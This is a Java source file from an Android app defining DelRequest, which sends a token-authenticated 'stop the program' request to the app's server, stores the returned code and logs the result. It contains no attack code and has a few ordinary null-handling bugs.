package com.inet.android.request;

import java.io.IOException;

import org.json.JSONException;
import org.json.JSONObject;

import android.content.Context;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.os.AsyncTask;
import android.preference.PreferenceManager;

import com.inet.android.db.RequestDataBaseHelper;
import com.inet.android.utils.Logging;

/**
 * DelRequest class is designed to stop the program
 * 
 * @author johny homicide
 * 
 */
public class DelRequest extends DefaultRequest {
	private final String LOG_TAG = DelRequest.class.getSimpleName().toString();
	static RequestDataBaseHelper db;
	SharedPreferences sp;
	Context mContext;

	public DelRequest(Context ctx) {
		super(ctx);
		this.mContext = ctx;
		sp = PreferenceManager.getDefaultSharedPreferences(ctx);
	}

	@Override
	public void sendRequest(String request) {
		DelTask srt = new DelTask();
		srt.execute(request);
	}

	class DelTask extends AsyncTask<String, Void, Void> {
		@Override
		protected Void doInBackground(String... strs) {
			sendPostRequest(strs[0]);
			return null;
		}
	}

	@Override
	protected void sendPostRequest(String request) {
		String str = null;

		try {
			Logging.doLog(LOG_TAG, request, request);
			str = Caller.doMake(request,
					sp.getString("access_first_token", ""),
					ConstantValue.DEL_LINK, true, null, ctx);
		} catch (IOException e) {
			e.printStackTrace();
		}

		if (str != null && str.length() > 3) {
			getRequestData(str);
		} else if (str.length() == 3) {
			Logging.doLog(LOG_TAG, "error: " + str, "error: " + str);
			DisassemblyErrors.setError(str, "", ConstantValue.TYPE_DEL_REQUEST, -1,
					"", -1, mContext);
			RequestList.sendRequestForFirstToken(mContext);
		} else {
			Logging.doLog(LOG_TAG,
					"response from the server is missing or incorrect",
					"response from the server is missing or incorrect");
		}

	}

	@Override
	protected void getRequestData(String response) {
		Logging.doLog(LOG_TAG, "getResponseData: " + response,
				"getResponseData: " + response);

		Editor ed = sp.edit();

		JSONObject jsonObject = null;
		try {
			jsonObject = new JSONObject(response);
		} catch (JSONException e) {
			if (response == null) {
				Logging.doLog(LOG_TAG, "json null", "json null");
			}
			return;
		}

		String str = null;
		try {
			str = jsonObject.getString("code");
		} catch (JSONException e) {
			e.printStackTrace();
		}
		if (str != null) {
			ed.putString("code_del", str);
		} else {
			ed.putString("code_del", "code");
		}

		if (str.equals("1")) {
			Logging.doLog(LOG_TAG, "total annihilation", "total annihilation");
		}
		if (str.equals("0")) {
			DisassemblyErrors.setError(response, mContext);
		}
		ed.commit();
	}

	@Override
	public void sendRequest(int request) {
		// TODO Auto-generated method stub

	}

}